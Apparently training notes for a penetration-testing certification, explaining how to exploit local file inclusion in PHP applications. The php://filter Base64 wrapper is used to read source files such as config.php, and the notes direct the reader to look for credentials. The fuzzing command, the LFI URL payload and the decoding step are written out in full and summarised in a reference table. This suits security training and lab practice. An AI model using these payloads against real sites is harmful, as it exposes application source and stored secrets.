# PHP Filters

## What are PHP Filters?

PHP Filters can transform data during stream operations. With LFI, the `php://filter/` wrapper can be used to process a local file before it is returned. 

The most useful filter for LFI is:

```text
convert.base64-encode
```

It allows us to **read PHP source code instead of executing it**.

---

## 1. Find PHP Files

First, fuzz for PHP files using `ffuf` or `gobuster`:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

Example results:

```text
index   [Status: 200]
config  [Status: 302]
```

With LFI, don't restrict yourself to `200` responses. Files returning `301`, `302`, or `403` may still contain useful source code. 

---

## 2. Normal PHP Inclusion

If you include a PHP file normally:

```text
http://<SERVER_IP>:<PORT>/index.php?language=config
```

the PHP file is **executed**, not displayed as source code.

If `config.php` only contains configuration variables, the response may appear empty because it doesn't generate HTML output. 

---

## 3. Read PHP Source with `php://filter`

Use:

```text
php://filter/read=convert.base64-encode/resource=config
```

For an LFI parameter:

```text
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

The application returns the PHP source as a **Base64-encoded string** instead of executing it. 

### Why `config` instead of `config.php`?

If the application automatically appends `.php`, specifying:

```text
resource=config
```

results in:

```text
config.php
```



---

## 4. Decode the Source

Copy the **complete Base64 output** and decode it:

```bash
echo 'BASE64_DATA' | base64 -d
```

This reveals the original PHP source code. 

---

## 5. Source Code Enumeration

Once you obtain source code:

1. Look for **credentials and database keys**.
2. Identify other referenced PHP files.
3. Read those files using the same filter.
4. Continue until you understand the application's structure and functionality. 

---

## Quick Reference

| Goal              | Payload / Command                                         |
| ----------------- | --------------------------------------------------------- |
| PHP filter        | `php://filter/`                                           |
| Base64 filter     | `convert.base64-encode`                                   |
| Read `config.php` | `php://filter/read=convert.base64-encode/resource=config` |
| Decode output     | `echo 'BASE64_DATA' \| base64 -d`                         |
| Find PHP files    | `ffuf ... /FUZZ.php`                                      |

### CPTS Takeaway

**LFI + `php://filter` → Base64-encode PHP source → retrieve → decode → analyze source code.**

This is especially useful when the application automatically appends `.php` and normal LFI causes the PHP file to execute instead of exposing its source. 
